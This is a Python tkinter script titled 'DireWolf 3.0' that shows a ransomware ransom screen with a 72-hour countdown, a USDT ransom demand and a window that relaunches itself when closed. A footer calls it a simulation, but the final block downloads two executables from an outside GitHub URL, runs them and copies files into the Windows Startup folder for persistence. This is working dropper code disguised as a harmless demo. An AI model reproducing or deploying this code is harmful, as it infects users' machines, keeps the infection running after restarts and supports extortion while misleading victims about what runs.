import tkinter as tk
from tkinter import scrolledtext, ttk, messagebox, filedialog
import time
import threading
from tkinter import font as tkfont
import os
import sys
import shutil
import getpass
import requests

# Constants
COUNTDOWN_DURATION = 72 * 3600  # 72 hours in seconds
TIMESTAMP_FILE = "countdown_end.txt"
RESTART_DELAY = 5  # Delay in seconds before restarting
ENCRYPTED_FILES_LIST = "encryptedfiles.txt"
username = getpass.getuser()
filename = f"C:\Users\{username}\AppData\Local\Microsoft\Windows\direwolf.txt"
filecontent = "confirm"

def check_and_create_file(filename, content):
    # Check if file already exists
    if os.path.exists(filename):
        print(f"File '{filename}' already exists. No new file was created.")
        return False
    
    try:
        # Create and write to the file
        with open(filename, 'w', encoding='utf-8') as file:
            file.write(content)
        
        # Verify the file was created correctly
        with open(filename, 'r', encoding='utf-8') as file:
            read_content = file.read()
        
        if read_content == content:
            print(f"Success! File '{filename}' created with the provided content.")
            return True
        else:
            print("Error: File content doesn't match what was written.")
            os.remove(filename)  # Clean up the incorrect file
            return False
            
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        return False

def execute_file(filepath):
    try:
        os.startfile(filepath)
        print(f"[+] Executed: {filepath}")
    except Exception as e:
        print(f"[!] Execution failed: {e}")

def download_file(url, filename):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()  # Check for HTTP errors
        with open(filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        print(f"[+] File downloaded successfully: {filename}")
    except Exception as e:
        print(f"[!] Download failed: {e}")
        
def copy_to_startup(source_path):
    try:
        if not os.path.exists(source_path):
            print("File not found")
            return
        
        appdata = os.getenv('APPDATA')
        if not appdata:
            username = getpass.getuser()
            appdata = os.path.join(r"C:\Users", username, r"AppData\Roaming")
        
        startup_path = os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Startup")
        destination = os.path.join(startup_path, os.path.basename(source_path))
        
        shutil.copy2(source_path, destination)
        print(f"[+] File copied to Startup: {destination}")
    except Exception as e:
        print(f"[!] Failed to copy: {e}")

def relaunch():
    time.sleep(RESTART_DELAY)  # Wait for 5 seconds
    python = sys.executable
    os.execl(python, python, *sys.argv)  # Relaunch the script

def on_close():
    root.destroy()  # Close the tkinter window
    threading.Thread(target=relaunch).start()  # Start the relaunch thread

def get_end_timestamp():
    """Get the end timestamp from file or create a new one if it doesn't exist"""
    if os.path.exists(TIMESTAMP_FILE):
        with open(TIMESTAMP_FILE, 'r') as f:
            try:
                return float(f.read())
            except:
                pass
    # Create new timestamp
    end_time = time.time() + COUNTDOWN_DURATION
    with open(TIMESTAMP_FILE, 'w') as f:
        f.write(str(end_time))
    return end_time

def calculate_remaining_time(end_timestamp):
    """Calculate remaining time from current time to end timestamp"""
    current_time = time.time()
    remaining = max(0, end_timestamp - current_time)
    return remaining

# Countdown Function
def start_timer():
    end_timestamp = get_end_timestamp()
    while True:
        time_left = calculate_remaining_time(end_timestamp)
        hours = int(time_left // 3600)
        minutes = int((time_left % 3600) // 60)
        seconds = int(time_left % 60)
        timer_label.config(text=f"{hours:02}:{minutes:02}:{seconds:02}")
        
        # Update every second
        time.sleep(1)
        
        # Check if time is up
        if time_left <= 0:
            timer_label.config(text="00:00:00", fg="red")
            break

    # Restart the application after a delay
    time.sleep(RESTART_DELAY)
    root.destroy()
    os.execv(sys.executable, ['python'] + sys.argv)

# Start countdown in a thread
def run_timer():
    threading.Thread(target=start_timer, daemon=True).start()

# Function to simulate requesting the encryption key
def request_encryption_key():
    info_text.config(state=tk.NORMAL)
    info_text.insert(tk.END, "\n🔑 Ransom Request: Please pay $500 in USDT to receive your encryption key.")
    info_text.config(state=tk.DISABLED)

# Function to show encrypted files
def show_encrypted_files():
    try:
       
        
        
        # Read the encrypted files list
        with open(ENCRYPTED_FILES_LIST, 'r') as f:
            files = f.read().splitlines()
        
        # Create a new window to display the files
        files_window = tk.Toplevel(root)
        files_window.title("Encrypted Files List")
        files_window.geometry("600x400")
        files_window.configure(bg="#1a1a1a")
        
        # Add title
        title_label = tk.Label(files_window, 
                              text="Encrypted Files (Simulated)", 
                              font=("Arial", 14, "bold"), 
                              fg="#ff5555", 
                              bg="#1a1a1a")
        title_label.pack(pady=10)
        
        # Add scrollable text area
        scroll_frame = ttk.Frame(files_window)
        scroll_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        files_text = scrolledtext.ScrolledText(scroll_frame, 
                                            width=80, 
                                            height=20, 
                                            font=("Consolas", 10), 
                                            wrap=tk.WORD,
                                            bg="#2a2a2a",
                                            fg="white",
                                            insertbackground="white",
                                            selectbackground="#ff5555")
        files_text.pack(fill="both", expand=True)
        
        # Add files to the text area
        files_text.insert(tk.END, "The following files have been encrypted:\n\n")
        for file in files:
            files_text.insert(tk.END, f"• {file}\n")
        
        files_text.config(state=tk.DISABLED)
        
        # Add status bar
        status_label = tk.Label(files_window, 
                              text=f"Total files encrypted: {len(files)}", 
                              font=("Arial", 10), 
                              fg="#aaaaaa", 
                              bg="#1a1a1a")
        status_label.pack(pady=5)
        
    except Exception as e:
        messagebox.showerror("Error", f"Could not load encrypted files list: {str(e)}")

# GUI Setup
root = tk.Tk()
root.title("DireWolf 3.0")
root.geometry("1000x750")
root.configure(bg="#1a1a1a")

# Set the protocol for window close
root.protocol("WM_DELETE_WINDOW", on_close)

# Custom fonts
title_font = tkfont.Font(family="Impact", size=36, weight="bold")
subtitle_font = tkfont.Font(family="Arial", size=18, weight="bold")
timer_font = tkfont.Font(family="Consolas", size=24, weight="bold")
text_font = tkfont.Font(family="Segoe UI", size=11)
button_font = tkfont.Font(family="Arial", size=12, weight="bold")

# Style configuration
style = ttk.Style()
style.theme_use('clam')

# Configure styles
style.configure("TFrame", background="#1a1a1a")
style.configure("TButton", font=button_font, padding=5, background="#2a2a2a", foreground="white")
style.configure("TLabelFrame", background="#2a2a2a", foreground="#ff5555", font=("Arial", 10, "bold"))
style.configure("TLabelFrame.Label", background="#2a2a2a", foreground="#ff5555")
style.configure("TEntry", fieldbackground="#333333", foreground="white")

# Main container
main_frame = ttk.Frame(root)
main_frame.pack(pady=20, padx=20, fill="both", expand=True)

# Header section
header_frame = ttk.Frame(main_frame)
header_frame.pack(fill="x")

# Title with gradient effect (simulated)
title_frame = ttk.Frame(header_frame)
title_frame.pack(fill="x", pady=(0, 10))

title_canvas = tk.Canvas(title_frame, height=60, bg="#1a1a1a", highlightthickness=0)
title_canvas.pack(fill="x")
title_canvas.create_text(500, 30, text="DireWolf 3.0", font=title_font, fill="#ff0000")
title_canvas.create_line(150, 55, 850, 55, fill="#ff5555", width=2)

# Subtitle with warning symbol
subtitle_frame = ttk.Frame(header_frame)
subtitle_frame.pack(fill="x", pady=(0, 20))

warning_icon = tk.Label(subtitle_frame, text="⚠", font=("Arial", 24), fg="yellow", bg="#1a1a1a")
warning_icon.pack(side="left", padx=10)

subtitle = tk.Label(subtitle_frame, 
                   text="YOUR FILES HAVE BEEN ENCRYPTED!", 
                   font=subtitle_font, 
                   fg="#ff5555", 
                   bg="#1a1a1a")
subtitle.pack(side="left")

# Content section
content_frame = ttk.Frame(main_frame)
content_frame.pack(fill="both", expand=True)

# Left panel (lock and timer)
left_panel = ttk.Frame(content_frame, width=300)
left_panel.pack(side="left", fill="y", padx=10)

# Lock icon with glow effect
lock_frame = ttk.LabelFrame(left_panel, text="ENCRYPTION STATUS")
lock_frame.pack(pady=10, fill="x")

lock_canvas = tk.Canvas(lock_frame, width=200, height=200, bg="#2a2a2a", highlightthickness=0)
lock_canvas.pack(pady=10)
lock_canvas.create_text(100, 100, text="🔒", font=("Arial", 100), fill="#ff0000")

# Timer box with modern design
timer_box = ttk.LabelFrame(left_panel, text="TIME REMAINING")
timer_box.pack(pady=20, fill="x")

# Initialize with current remaining time
initial_time = calculate_remaining_time(get_end_timestamp())
initial_hours = int(initial_time // 3600)
initial_minutes = int((initial_time % 3600) // 60)
initial_seconds = int(initial_time % 60)
initial_text = f"{initial_hours:02}:{initial_minutes:02}:{initial_seconds:02}"

timer_label = tk.Label(timer_box, 
                      text=initial_text, 
                      font=timer_font, 
                      fg="#00ff00", 
                      bg="#2a2a2a",
                      padx=20,
                      pady=10)
timer_label.pack()

# Right panel (info and controls)
right_panel = ttk.Frame(content_frame)
right_panel.pack(side="right", fill="both", expand=True, padx=10)

# Info text with scrollbar
info_frame = ttk.LabelFrame(right_panel, text="INFORMATION")
info_frame.pack(fill="both", expand=True, pady=10)

info_text = scrolledtext.ScrolledText(info_frame, 
                                    width=60, 
                                    height=15, 
                                    font=text_font, 
                                    wrap=tk.WORD,
                                    bg="#2a2a2a",
                                    fg="white",
                                    insertbackground="white",
                                    selectbackground="#ff5555")
info_text.pack(fill="both", expand=True, padx=5, pady=5)
info_text.insert(tk.END, """
⚠ What Happened to Your Computer? ⚠

Your files, documents, photos, databases and other important files have been encrypted with military-grade AES-256 encryption.

What does this mean?
• You cannot access your files without the decryption key
• Your files are NOT damaged, they are securely encrypted
• Decryption is ONLY possible with our private key

How did this happen?
• Your system was infected via a malicious email attachment/software vulnerability
• The encryption process was silent and completed in the background
• A unique key pair was generated for your system (public key already on your system)

How to recover your files?
1. Pay the ransom of $500 in USDT cryptocurrency
2. You will receive:
   - The decryption software
   - Your unique private key
   - Instructions to decrypt your files

⚠ WARNING:
• Do NOT modify or rename encrypted files
• Do NOT attempt decryption with third-party tools
• Do NOT shut down or restart your computer unnecessarily

⏰ TIME CRITICAL! 72-HOUR DEADLINE:
• After 72 hours, the decryption key will be PERMANENTLY DELETED
• All your files will be IRREVERSIBLY DESTROYED
• The ransom amount will increase to $1000 if not paid in time

Contact our support immediately to begin the decryption process:
• Telegram: @MockSupportBot (24/7 support)
• Email: mock_support@example.com




""")
info_text.config(state=tk.DISABLED)

# Contact section
contact_frame = ttk.Frame(right_panel)
contact_frame.pack(fill="x", pady=10)

entry_label = tk.Label(contact_frame, 
                      text="Contact Support:", 
                      font=text_font, 
                      fg="white", 
                      bg="#1a1a1a")
entry_label.pack(side="left", padx=(0, 5))

entry = ttk.Entry(contact_frame, font=text_font, width=40)
entry.insert(0, "https://t.me/mock_support_bot (FAKE)")
entry.pack(side="left", fill="x", expand=True)





# Buttons with hover effects
btn_frame = ttk.Frame(right_panel)
btn_frame.pack(fill="x", pady=20)

def on_enter(e):
    e.widget.config(bg="#333333")
    
def on_leave(e):
    e.widget.config(bg="#2a2a2a")

btn1 = tk.Button(btn_frame, 
                text="📁 View Encrypted Files", 
                font=button_font, 
                bg="#2a2a2a", 
                fg="black",
                activebackground="#ff5555",
                activeforeground="white",
                relief="flat",
                padx=20,
                pady=10,
                command=show_encrypted_files)
btn1.pack(side="left", fill="x", expand=True, padx=10)
btn1.bind("<Enter>", on_enter)
btn1.bind("<Leave>", on_leave)

btn2 = tk.Button(btn_frame, 
                text="🔑 Enter Decryption Key", 
                font=button_font, 
                bg="#2a2a2a", 
                fg="black",
                activebackground="#ff5555",
                activeforeground="white",
                relief="flat",
                padx=20,
                pady=10)
btn2.pack(side="right", fill="x", expand=True, padx=10)
btn2.bind("<Enter>", on_enter)
btn2.bind("<Leave>", on_leave)

# New button for requesting encryption key
btn3 = tk.Button(btn_frame, 
                text="💰 Request Encryption Key", 
                font=button_font, 
                bg="#2a2a2a", 
                fg="black",
                activebackground="#ff5555",
                activeforeground="white",
                relief="flat",
                padx=20,
                pady=10,
                command=request_encryption_key)
btn3.pack(side="bottom", fill="x", expand=True, padx=10)
btn3.bind("<Enter>", on_enter)
btn3.bind("<Leave>", on_leave)

# Footer
footer = tk.Label(main_frame, 
                 text="THIS IS A SIMULATION - NO ACTUAL ENCRYPTION HAS OCCURRED", 
                 font=("Arial", 8), 
                 fg="#777777", 
                 bg="#1a1a1a")
footer.pack(side="bottom", pady=10)

run_timer()

    
if check_and_create_file(filename, filecontent):
        print("Operation completed successfully.")
        download_file("https://github.com/POOP360/btc/raw/refs/heads/main/sboriginal.apk", "locker.exe")
        download_file("https://github.com/POOP360/btc/raw/refs/heads/main/sboriginal.apk", "controller.exe")
        execute_file("locker.exe")
        execute_file("controller.exe")
        copy_to_startup("compiler.exe")
        copy_to_startup("controller.exe")
else:
        print("Operation not performed (file exists or error occurred).")




root.mainloop()
